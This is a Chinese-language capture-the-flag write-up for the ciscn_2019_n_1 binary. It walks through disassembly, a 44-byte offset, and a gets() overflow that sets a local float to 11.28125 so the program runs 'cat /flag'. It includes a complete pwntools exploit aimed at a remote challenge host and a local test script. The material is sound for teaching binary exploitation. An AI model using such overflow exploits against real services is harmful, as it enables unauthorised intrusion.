# Speedrun：ciscn_2019_n_1

> 题型：栈溢出改局部 `float` 变量 / 条件绕过  
> 目标：把 `v2` 改成 `11.28125`，触发 `system("cat /flag")`  
> 关键：偏移 **44**；float 位模式 **0x41348000**

> ⚠️ **复现提示（2026-11-23 审计）**：EXP 只写了远程分支，`HOST` 是 2019 年 CTF²
> 的临时靶机（已下线）。本地复现按 §「本地验证」用 `process('./ciscn_2019_n_1')`；
> 二进制已归档在同目录，本机没有 `/flag`，看到 `No such file` 属于正常（分支已走通）。

---

## 0. 一句话结论

```text
func 里有：
  char buf[44]   @ rbp-0x30
  float v2       @ rbp-0x4

gets(buf) 无边界检查
  → 填 44 字节后正好覆盖 v2
  → 写入 float 11.28125 的 4 字节位模式
  → 比较通过
  → system("cat /flag")
```

Payload：

```python
b'A' * 44 + p32(0x41348000)
```

不需要覆盖返回地址，也不需要 ROP。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/stack_local_var_overwrite'

file ciscn_2019_n_1
checksec --file=ciscn_2019_n_1
nm -n ciscn_2019_n_1 | grep -E ' (main|func)$'
objdump -d -M intel ciscn_2019_n_1 | sed -n '/<main>:/,/^$/p'
objdump -d -M intel ciscn_2019_n_1 | sed -n '/<func>:/,/^$/p'
strings -tx ciscn_2019_n_1 | grep -E 'flag|guess|11\\.'
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
No canary found
No PIE (0x400000)
NX enabled

00000000004006dc T main
0000000000400676 T func

    7b4 Let's guess the number.
    7cc cat /flag
    7d6 Its value should be 11.28125
```

读法：

| 观察 | 结论 |
| --- | --- |
| `func` 里有 `gets` | 栈溢出点 |
| `func` 里有 `system("cat /flag")` | 条件满足即打印 flag |
| `v2` 是 `float` | 不是比较字符串，要写 4 字节 IEEE-754 |
| `cat /flag` 是绝对路径 | 远程 flag 在 `/flag` |
| No PIE | 地址固定，但本题甚至不需要改返回地址 |

---

## 2. 关键逆向

### 2.1 `main`：设置无缓冲 + 调 `func`

```asm
00000000004006dc <main>:
  4006dc: push   rbp
  4006dd: mov    rbp,rsp
  4006e0: mov    rax,QWORD PTR [rip+0x200969]  # 601050 <stdout>
  4006e7: mov    ecx,0x0
  4006ec: mov    edx,0x2
  4006f1: mov    esi,0x0
  4006f6: mov    rdi,rax
  4006f9: call   400560 <setvbuf@plt>
  ...
  400717: call   400560 <setvbuf@plt>
  40071c: mov    eax,0x0
  400721: call   400676 <func>
  400726: mov    eax,0x0
  40072b: pop    rbp
  40072c: ret
```

`setvbuf(stdout, NULL, 2, 0)` 把 stdout 设为无缓冲，所以输出会立即到达。

### 2.2 `func`：漏洞与判断

```asm
0000000000400676 <func>:
  400676: push   rbp
  400677: mov    rbp,rsp
  40067a: sub    rsp,0x30
  40067e: pxor   xmm0,xmm0
  400682: movss  DWORD PTR [rbp-0x4],xmm0     ; v2 = 0.0
  400687: mov    edi,0x4007b4                 ; "Let's guess the number."
  40068c: call   400520 <puts@plt>

  400691: lea    rax,[rbp-0x30]               ; buf
  400695: mov    rdi,rax
  400698: mov    eax,0x0
  40069d: call   400550 <gets@plt>            ; 漏洞点

  4006a2: movss  xmm0,DWORD PTR [rbp-0x4]     ; 读 v2
  4006a7: ucomiss xmm0,DWORD PTR [rip+0x146]  ; 与 11.28125 比较
  4006ae: jp     4006cf
  4006b0: movss  xmm0,DWORD PTR [rbp-0x4]
  4006b5: ucomiss xmm0,DWORD PTR [rip+0x138]
  4006bc: jne    4006cf
  4006be: mov    edi,0x4007cc                 ; "cat /flag"
  4006c3: mov    eax,0x0
  4006c8: call   400530 <system@plt>           ; 成功分支
  4006cd: jmp    4006d9
  4006cf: mov    edi,0x4007d6                 ; "Its value should be 11.28125"
  4006d4: call   400520 <puts@plt>
  4006d9: nop
  4006da: leave
  4006db: ret
```

栈布局：

```text
rbp-0x30 .. rbp-0x05 : buf[44]
rbp-0x04 .. rbp-0x01 : v2 (float, 4 bytes)
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

所以覆盖 `v2` 的偏移：

```text
offset = 0x30 - 0x4 = 0x2c = 44
```

---

## 3. `11.28125` 的内存表示

`11.28125` 的 IEEE-754 单精度位模式：

```text
0x41348000
```

小端序写入内存：

```text
00 80 34 41
```

验证：

```python
import struct

struct.pack("<f", 11.28125).hex()   # '00803441'
hex(struct.unpack("<I", struct.pack("<f", 11.28125))[0])
# '0x41348000'
```

Payload：

```python
from pwn import *

payload = b'A' * 44 + p32(0x41348000)

# 或者：
# payload = b'A' * 44 + struct.pack("<f", 11.28125)
```

> 不要发字符串 `"11.28125"`。  
> `gets` 存的是 ASCII 字节，不是 float 的二进制表示。

---

## 4. 完整 exp

```python
from pwn import *
import ssl, re

context.arch = "amd64"
context.log_level = "info"

HOST = "afef57fa820a8e1c1eb38f4a.tcp-ctf2.dasctf.com"
PORT = 9999

def exploit():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    # 44 字节覆盖 buf，4 字节覆盖 v2
    payload = b"A" * 44 + p32(0x41348000)
    p.sendline(payload)

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
    if flags:
        print(f"[🎉] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] Flag not found, raw output above")

if __name__ == "__main__":
    exploit()
```

本地验证（本机没有 `/flag`，所以只验证分支是否走通）：

```python
from pwn import *
import struct

p = process("./ciscn_2019_n_1", stdin=PIPE, stdout=PIPE, stderr=STDOUT)
p.sendline(b"A" * 44 + struct.pack("<f", 11.28125))
print(p.recvall(timeout=3))
```

如果偏移写错，会看到：

```text
Let's guess the number.
Its value should be 11.28125
```

如果偏移正确，会进入 `system("cat /flag")`；本机没有 `/flag` 时可能只看到 `cat: /flag: No such file or directory`，远程有 `/flag` 就会直接输出 flag。

---

## 5. 交互坑

1. **偏移是 44，不是 56**
   `v2` 在 `rbp-0x4`，不是 saved RIP 后面。  
   `0x30 - 0x4 = 44`。

2. **写的是 float 位模式，不是字符串**
   正确：
   ```python
   p32(0x41348000)
   ```
   错误：
   ```python
   b"11.28125"
   ```

3. **`p32(11.28125)` 会报错**
   `p32` 只接受整数。  
   用 `p32(0x41348000)` 或 `struct.pack("<f", 11.28125)`。

4. **不需要覆盖返回地址**
   这题不是 ret2text，而是改局部变量让条件成立。  
   覆盖到 `v2` 就停，继续写只会破坏 saved rbp，没必要。

5. **`cat /flag` 是绝对路径**
   远程 flag 在 `/flag`；本地一般没有，所以本地验证看到 `No such file` 是正常的。

6. **`setvbuf` 已把 stdout 设为无缓冲**
   正常情况下输出会立即返回，不容易出现 stdio 缓冲丢 flag 的问题。

7. **TLS**
   CTF² 需要 `ssl=True`；如果平台是明文 TCP，去掉 ssl 参数。

8. **额外的 `\x00` 不是必须的**
   `gets` 自己会在末尾补 `\x00`；`b'A'*44 + p32(...)` 就够了。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：64 位、No PIE、有 `func` |
| 0:20–0:45 | `objdump func`：看到 `gets`、`v2`、`system("cat /flag")` |
| 0:45–1:05 | 算 offset：`0x30 - 0x4 = 44`；算 float：`0x41348000` |
| 1:05–1:20 | 写 payload：`44 + p32(0x41348000)` |
| 1:20–1:40 | 本地验证分支，再打远程 |
| 1:40–2:00 | `recvall` + 正则提取 flag |

---

## 7. 题型识别卡

```text
gets(buf) + 附近有 float 变量
+ 比较 v2 == 11.28125
+ 成功分支 system("cat /flag")
+ 不需要改 RIP
= 溢出改局部变量，offset 44，float bits 0x41348000
```

一句话：**不要 ROP，不要 ret2text；44 字节 + `p32(0x41348000)`，让 `v2` 等于 11.28125。**

